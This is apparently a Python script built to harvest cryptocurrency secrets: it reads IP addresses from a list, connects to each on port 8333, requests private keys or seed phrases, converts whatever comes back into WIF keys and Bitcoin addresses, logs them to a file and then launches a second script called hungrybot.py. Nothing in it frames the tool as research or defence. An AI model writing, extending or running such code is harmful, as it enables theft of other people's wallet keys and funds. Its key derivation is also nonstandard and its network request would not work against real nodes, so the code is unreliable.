import os
import hashlib
import binascii
import socket
import subprocess  # Import subprocess to run other scripts
from ellipticcurve.privateKey import PrivateKey
from mnemonic import Mnemonic

LIST_FILE = r'list.txt'
PORT = 8333  # Example port, this should be the port where you're expecting the keys or phrases

def generate_private_key(seed_phrase=None):
    if seed_phrase:
        mnemo = Mnemonic("english")
        seed = mnemo.to_seed(seed_phrase)
        private_key = hashlib.sha256(seed).hexdigest().upper()
        return private_key
    return None

def private_key_to_public_key(private_key):
    pk = PrivateKey().fromString(bytes.fromhex(private_key))
    return '04' + pk.publicKey().toString().hex().upper()

def public_key_to_address(public_key):
    output = []
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    var = hashlib.new('ripemd160')
    encoding = binascii.unhexlify(public_key.encode())
    var.update(hashlib.sha256(encoding).digest())
    var_encoded = ('00' + var.hexdigest()).encode()
    digest = hashlib.sha256(binascii.unhexlify(var_encoded)).digest()
    var_hex = '00' + var.hexdigest() + hashlib.sha256(digest).hexdigest()[0:8]
    count = [char != '0' for char in var_hex].index(True) // 2
    n = int(var_hex, 16)
    while n > 0:
        n, remainder = divmod(n, 58)
        output.append(alphabet[remainder])
    for i in range(count): output.append(alphabet[0])
    return ''.join(output[::-1])

def private_key_to_WIF(private_key):
    digest = hashlib.sha256(binascii.unhexlify(b'80' + private_key.encode())).hexdigest()
    var = hashlib.sha256(binascii.unhexlify(digest)).hexdigest()
    var = binascii.unhexlify(b'80' + private_key.encode() + var[0:8].encode())
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    value = pad = 0
    result = ''
    for i, c in enumerate(var[::-1]): value += 256**i * c
    while value >= len(alphabet):
        div, mod = divmod(value, len(alphabet))
        result, value = alphabet[mod] + result, div
    result = alphabet[value] + result
    for c in var:
        if c == 0: pad += 1
        else: break
    return alphabet[0] * pad + result

def connect_to_ip(ip):
    try:
        with socket.create_connection((ip, PORT), timeout=10) as s:
            s.sendall(b"GET_PRIVATE_KEYS_OR_SEEDS")
            response = s.recv(1024).decode('utf-8')
            return response.splitlines()
    except (socket.timeout, ConnectionRefusedError, socket.gaierror) as e:
        print(f"Failed to connect to {ip}: {e}")
        return None

def process_keys_or_phrases(keys_or_phrases):
    for item in keys_or_phrases:
        if len(item.split()) >= 12:
            seed_phrase = item
            private_key = generate_private_key(seed_phrase)
        else:
            seed_phrase = None
            private_key = item

        if private_key:
            public_key = private_key_to_public_key(private_key)
            address = public_key_to_address(public_key)
            process(seed_phrase, private_key, public_key, address)

def process(seed_phrase, private_key, public_key, address):
    with open('plutus.txt', 'a') as file:
        file.write('Seed Phrase: ' + str(seed_phrase) + '\n' +
                   'Hex Private Key: ' + str(private_key) + '\n' +
                   'WIF Private Key: ' + str(private_key_to_WIF(private_key)) + '\n' +
                   'Public Key: ' + str(public_key) + '\n' +
                   'Address: ' + str(address) + '\n\n')

def start_hungrybot():
    """
    Start the hungrybot.py script.
    """
    try:
        subprocess.run(["python", "hungrybot.py"], check=True)
        print("hungrybot.py started successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to start hungrybot.py: {e}")

def main():
    if not os.path.exists(LIST_FILE):
        print(f"File {LIST_FILE} not found.")
        return

    with open(LIST_FILE, 'r') as f:
        ip_ranges = f.readlines()

    for ip in ip_ranges:
        ip = ip.strip()
        if not ip:
            continue

        keys_or_phrases = connect_to_ip(ip)
        if keys_or_phrases:
            process_keys_or_phrases(keys_or_phrases)
    
    # Start the hungrybot.py script after processing
    start_hungrybot()

if __name__ == '__main__':
    main()
